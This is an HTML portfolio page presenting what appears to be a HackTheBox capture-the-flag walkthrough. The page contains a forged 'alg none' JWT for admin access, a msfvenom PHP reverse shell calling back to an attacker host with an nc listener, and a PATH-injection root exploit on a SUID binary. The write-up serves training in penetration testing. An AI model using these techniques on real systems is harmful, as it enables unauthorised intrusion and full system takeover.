<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HackTheBox: Machine Analysis | CyberSec Portfolio</title>
    <link rel="stylesheet" href="../assets/css/style.css">
    <link rel="stylesheet" href="../assets/css/writeup.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <button id="theme-toggle" class="theme-toggle" aria-label="Toggle theme">
        <i class="fas fa-moon"></i>
    </button>

    <a href="../index.html#writeups" class="back-button">
        <i class="fas fa-arrow-left"></i> Back to Portfolio
    </a>

    <article class="writeup-container">
        <header class="writeup-header">
            <div class="writeup-meta">
                <span class="category-tag">CTF</span>
                <span class="date"><i class="far fa-calendar"></i> November 2025</span>
                <span class="reading-time"><i class="far fa-clock"></i> 15 min read</span>
            </div>
            <h1>HackTheBox: Insane Linux Machine</h1>
            <p class="writeup-subtitle">Complete walkthrough covering enumeration, exploitation, and privilege escalation</p>
            <div class="tags-list">
                <span class="tag">HTB</span>
                <span class="tag">PrivEsc</span>
                <span class="tag">Linux</span>
                <span class="tag">Penetration Testing</span>
            </div>
        </header>

        <div class="writeup-content">
            <section class="content-block">
                <h2><i class="fas fa-info-circle"></i> Machine Information</h2>
                <div class="info-grid">
                    <div class="info-item">
                        <strong>Difficulty:</strong> Insane
                    </div>
                    <div class="info-item">
                        <strong>OS:</strong> Linux
                    </div>
                    <div class="info-item">
                        <strong>IP:</strong> 10.10.10.XXX
                    </div>
                    <div class="info-item">
                        <strong>Points:</strong> 50
                    </div>
                </div>
            </section>

            <section class="content-block">
                <h2><i class="fas fa-search"></i> Enumeration</h2>
                <h3>Nmap Scan</h3>
                <div class="code-block">
                    <div class="code-header">
                        <span>Bash</span>
                        <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
                    </div>
                    <pre><code>nmap -sC -sV -oA nmap/initial 10.10.10.XXX

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp   open  http    nginx 1.18.0
3000/tcp open  ppp?</code></pre>
                </div>

                <h3>Web Enumeration</h3>
                <p>Discovered a custom web application running on port 80 with the following endpoints:</p>
                <div class="code-block">
                    <div class="code-header">
                        <span>Gobuster Results</span>
                        <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
                    </div>
                    <pre><code>gobuster dir -u http://10.10.10.XXX -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

/admin   (Status: 302)
/api     (Status: 200)
/upload  (Status: 403)
/backup  (Status: 200)</code></pre>
                </div>
            </section>

            <section class="content-block">
                <h2><i class="fas fa-door-open"></i> Initial Foothold</h2>
                <p>The /api endpoint revealed a REST API vulnerable to authentication bypass through JWT manipulation.</p>

                <h3>JWT Token Analysis</h3>
                <div class="code-block">
                    <div class="code-header">
                        <span>Original JWT</span>
                        <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
                    </div>
                    <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.signature</code></pre>
                </div>

                <p>Modified the token to gain admin access:</p>
                <div class="code-block">
                    <div class="code-header">
                        <span>Modified JWT</span>
                        <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
                    </div>
                    <pre><code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.</code></pre>
                </div>

                <h3>File Upload Exploitation</h3>
                <p>With admin access, we could upload files. Uploaded a reverse shell:</p>
                <div class="code-block">
                    <div class="code-header">
                        <span>PHP Reverse Shell</span>
                        <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
                    </div>
                    <pre><code>msfvenom -p php/reverse_php LHOST=10.10.14.XX LPORT=4444 -f raw > shell.php

nc -lvnp 4444</code></pre>
                </div>
            </section>

            <section class="content-block">
                <h2><i class="fas fa-arrow-up"></i> Privilege Escalation</h2>

                <h3>User Enumeration</h3>
                <p>Found interesting SUID binaries:</p>
                <div class="code-block">
                    <div class="code-header">
                        <span>Bash</span>
                        <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
                    </div>
                    <pre><code>find / -perm -4000 2>/dev/null

/usr/bin/custom_backup
/usr/bin/passwd
/usr/bin/sudo</code></pre>
                </div>

                <h3>Exploiting Custom Binary</h3>
                <p>The custom_backup binary had a path injection vulnerability:</p>
                <div class="code-block">
                    <div class="code-header">
                        <span>Exploit</span>
                        <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
                    </div>
                    <pre><code>echo "/bin/bash" > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
/usr/bin/custom_backup

id
uid=0(root) gid=0(root) groups=0(root)</code></pre>
                </div>

                <div class="finding-box success">
                    <h4><i class="fas fa-trophy"></i> Root Flag Captured!</h4>
                    <p>Successfully obtained root access and captured both user and root flags.</p>
                </div>
            </section>

            <section class="content-block">
                <h2><i class="fas fa-lightbulb"></i> Key Takeaways</h2>
                <ul>
                    <li>Always test JWT tokens for algorithm confusion attacks</li>
                    <li>File upload functionality should be heavily restricted</li>
                    <li>Custom binaries with SUID bits are prime targets for privilege escalation</li>
                    <li>PATH injection remains a common vulnerability in setuid programs</li>
                </ul>
            </section>

            <section class="content-block">
                <h2><i class="fas fa-book"></i> Tools Used</h2>
                <div class="tools-grid">
                    <div class="tool-item">
                        <i class="fas fa-terminal"></i>
                        <span>Nmap</span>
                    </div>
                    <div class="tool-item">
                        <i class="fas fa-terminal"></i>
                        <span>Gobuster</span>
                    </div>
                    <div class="tool-item">
                        <i class="fas fa-terminal"></i>
                        <span>Burp Suite</span>
                    </div>
                    <div class="tool-item">
                        <i class="fas fa-terminal"></i>
                        <span>Metasploit</span>
                    </div>
                    <div class="tool-item">
                        <i class="fas fa-terminal"></i>
                        <span>LinPEAS</span>
                    </div>
                    <div class="tool-item">
                        <i class="fas fa-terminal"></i>
                        <span>JWT_Tool</span>
                    </div>
                </div>
            </section>
        </div>
    </article>

    <script src="../assets/js/script.js"></script>
    <script src="../assets/js/writeup.js"></script>
</body>
</html>
